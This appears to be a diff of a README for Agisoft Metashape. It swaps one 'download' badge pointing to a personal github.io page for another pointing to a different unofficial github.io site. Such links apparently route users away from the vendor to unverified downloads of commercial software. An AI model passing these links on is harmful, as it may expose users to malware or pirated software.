@@ -4,11 +4,7 @@
 <img src="https://www.agisoftmetashape.com/wp-content/uploads/2024/11/Metashape_Logo.png" alt="Agisoft Metashape Logo" width="600">
 </div>
 
-<div align="center">
-<a href="https://thynizaudin.github.io/.github/metashape">
-<img src="https://img.shields.io/badge/GET_AGISOFT_METASHAPE-darkgreen?style=for-the-badge&logo=apple" alt="GET AGISOFT METASHAPE">
-</a>
-</div>
+[![Download Agisoft Metashape](https://img.shields.io/badge/Download-Agisoft%20Metashape-7C3AED?style=flat-square)](https://agisoft-metashape-detailed.github.io/.github/)
 
 ---
 
